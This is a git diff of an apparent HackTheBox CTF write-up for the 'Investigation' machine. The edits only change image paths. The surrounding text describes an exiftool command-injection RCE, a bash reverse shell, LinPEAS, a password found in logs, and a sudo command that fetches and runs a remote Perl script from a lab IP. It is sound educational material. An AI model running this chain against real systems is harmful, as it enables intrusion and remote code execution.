@@ -22,15 +22,15 @@ Web Exploit based. We would have to add `eforenzics.htb` to our `/etc/hosts` fil
 
 The website reveals some web application advertising Digital Forensic Services.
 
-<figure><img src="../../../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (11) (8).png" alt=""><figcaption></figcaption></figure>
 
 Clicking the big Go button reveals that we can upload a jpg file to the website for analysis.
 
-<figure><img src="../../../.gitbook/assets/image (16).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (16) (7).png" alt=""><figcaption></figcaption></figure>
 
 When I uploada file, it would produce a link to a report.
 
-<figure><img src="../../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>
 
 The file would be a .txt file of output from `exiftool` being used on the file.
 
@@ -42,9 +42,9 @@ Very obviously, there is a JPG RCE vulnerability here. One possible parameter to
 
 From this, I attempted a few direct OS command injections but it didn't work out well. I then attempted some Base64 encoded stuff, and a simple ping command works!
 
-<figure><img src="../../../.gitbook/assets/image (17).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (17) (10).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../../../.gitbook/assets/image (21).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (21) (7).png" alt=""><figcaption></figcaption></figure>
 
 We can then replace the Base64 encoded command with a simple bash reverse shell and it works!
 
@@ -69,7 +69,7 @@ drwxrwx---  3 smorton smorton 4096 Jan  9 10:47 smorton
 
 We need to do some looking around. I ran LinPEAS and found an interesting cronjob that was running.
 
-<figure><img src="../../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>
 
 Some backups of the `/home` directory were being created, and also there was an unquoted service path for the `date` binary.
 
@@ -113,7 +113,7 @@ So the key here is to watch for logging and file transfers that are occurring. W
 
 After looking around the entire log file (for a while), I chanced upon this string when searching for the Authentication term.
 
-<figure><img src="../../../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (12) (9).png" alt=""><figcaption></figcaption></figure>
 
 Turns out that this was the password for `smorton`. We can now `su` and capture the user flag.
 
@@ -162,6 +162,6 @@ smorton@investigation:~$ sudo /usr/bin/binary http://10.10.14.56/rev.perl lDnxUy
 Running...
 ```
 
-<figure><img src="../../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Definitely more on the CTF side of HTB.&#x20;
